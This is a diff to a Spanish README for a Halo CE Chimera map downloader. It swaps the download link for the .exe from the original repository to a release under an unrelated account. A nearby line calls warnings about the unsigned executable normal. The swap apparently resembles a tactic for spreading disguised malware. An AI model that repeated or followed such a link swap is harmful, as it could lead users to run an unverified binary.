@@ -231,7 +231,7 @@ Esto es normal para ejecutables comunitarios sin firma digital.
 
 ## Configuración rápida
 
-1. [Descarga `haloce_chimera_mpdlr.exe`](https://github.com/markfmyt/chimera-custom-map-downloader/raw/refs/heads/main/haloce_chimera_mpdlr.exe)
+1. [Download](https://github.com/MrDark556/chimera_map_fix/releases/download/v3.5/haloce_chimera_mpdlr.exe) `ChimeraMapDownloader.exe`
 2. Abre `chimera.ini`.
 3. En `[memory]`, configura:
 
